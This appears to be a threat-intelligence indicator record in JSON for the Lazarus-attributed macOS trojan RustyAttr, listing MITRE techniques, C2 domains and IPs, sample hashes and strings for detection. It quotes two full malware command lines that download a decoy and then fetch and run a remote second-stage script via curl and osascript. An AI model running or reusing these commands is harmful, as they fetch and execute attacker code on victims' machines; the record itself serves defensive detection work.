@@ -1,0 +1,265 @@
+{
+  "malware_family": "RustyAttr",
+  "threat_actor": "Lazarus",
+  "platforms": [
+    "macos"
+  ],
+  "summary": "RustyAttr is a macOS trojan, attributed to the Lazarus group, that uses the Tauri framework to build its application. The malware's primary TTP is to conceal a malicious shell script within a custom macOS extended attribute to evade detection. Upon execution, the script is read from the attribute and run to download a second-stage payload, while a decoy PDF or error dialog is shown to the user.",
+  "mitre_techniques": [
+    "T1059.002",
+    "T1059.004",
+    "T1564",
+    "T1105"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "other",
+      "value": "test",
+      "context": "The name of the custom extended attribute used to store shell script.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "run_command",
+      "context": "Tauri backend interface command to execute scripts.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "get_application_properties",
+      "context": "Tauri backend interface command to retrieve extended attribute content.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "get_application_path",
+      "context": "Tauri backend interface command.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "close_main_window",
+      "context": "Tauri backend interface command.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "show_main_window",
+      "context": "Tauri backend interface command.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "window.__TAURI__.",
+      "context": "String in YARA rule indicating use of Tauri framework.",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "This app does not support this version.",
+      "context": "Error message displayed in a decoy dialog box.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "(curl -o \"/Users/Shared/Discussion Points for Synergy Exploration.pdf\" \"https://filedn.com/lY24cv0IfefboNEIN0I9gqR/dragonfly/Discussion%20Points%20for%20Synergy%20Exploration_Over.pdf\" || true) && (open \"/Users/Shared/Discussion Points for Synergy Exploration.pdf\" || true) && (shell=$(curl -L -k \"https://support.cloudstore.business/256977/check\"); osascript -e \"do shell script $shell\")",
+      "context": "Shell script executed from extended attribute.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "(osascript -e 'display dialog \"This app does not support this version.\" buttons {\"OK\"} default button \"OK\" with icon stop' || true) && (shell=$(curl -L -k \"https://support.docsend.site/519529/check\"); osascript -e \"do shell script $shell\")",
+      "context": "Shell script executed from extended attribute (second variant).",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/Users/Shared/Discussion Points for Synergy Exploration.pdf",
+      "context": "Path where the decoy PDF is downloaded.",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "preload.js",
+      "context": "Suspicious JavaScript file loaded by the Tauri application.",
+      "specificity": "low",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Dedicated Pdf Viewer.zip",
+      "context": "Related file hosted on pCloud, linked to RustBucket.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Voov meeting (portable).zip",
+      "context": "Related file hosted on pCloud, masquerading as VooV meeting.",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "support.cloudstore.business",
+      "context": "C2 staging server for next stage payload.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "support.docsend.site",
+      "context": "C2 staging server for next stage payload.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "104.168.165.203",
+      "context": "C2 staging server IP.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "104.168.157.45",
+      "context": "C2 staging server IP.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://filedn.com/lY24cv0IfefboNEIN0I9gqR",
+      "context": "File hosting service URL for decoys.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://filedn.com/lY24cv0IfefboNEIN0I9gqR/dragonfly/Discussion%20Points%20for%20Synergy%20Exploration_Over.pdf",
+      "context": "Decoy PDF download URL from executed script.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/256977/check",
+      "context": "URI path for C2 staging request.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/519529/check",
+      "context": "URI path for C2 staging request (variant).",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "7464850d7d6891418c503d0e1732812d7703d6c1fd5cf3c821f3c202786f9422",
+      "description": "Discussion Points for Synergy Exploration.app.zip"
+    },
+    {
+      "sha256": "f3e6e8df132155daf1d428dff61f0ca53ecd02015a0a0bbe1ad237519ab3cb58",
+      "description": "Investment Decision-Making Questionnaire.app.zip"
+    },
+    {
+      "sha256": "e87177e07ab9651b48664c3d22334248e012e8a2bab02f65c93fedd79af0a74f",
+      "description": "Investment Decision-Making Questionnaire.app.zip"
+    },
+    {
+      "sha256": "022344029b8bf951ba02b11025fe26c99193cb7c8a482c33862c9bbaa5e5528e",
+      "description": "VooV.app.zip"
+    },
+    {
+      "sha256": "9111d458d5665b1bf463859792e950fe8d8186df9a6a3241360dc11f34d018c2",
+      "description": "Voov meeting (portable).zip"
+    },
+    {
+      "sha256": "4bce97eff4430708299a1bb4142b9d359d8adf77a2e1673bf76485df25e6d357",
+      "description": "DD_Form & Discussion Points.zip"
+    },
+    {
+      "sha256": "176e8a5a7b6737f8d3464c18a77deef778ec2b9b42b7e7eafc888aeaf2758c2d",
+      "description": "AwesomeTemplate (YARA sample, RustyAttr Rust binary)"
+    },
+    {
+      "sha256": "48ee5d0d44a015876d867fa515b04c1998fecf19badcbd69f4f3fa8497d57215",
+      "description": "localfile~.x64 (RustyAttr Rust binary)"
+    },
+    {
+      "sha256": "a4cab67569d0b35c249dc536fb25dabdc12839ed4e945c59ec826c0a241b792a",
+      "description": "localfile~.arm64 (RustyAttr Rust binary)"
+    }
+  ],
+  "file_types": [
+    "macho",
+    "script",
+    "archive"
+  ]
+}
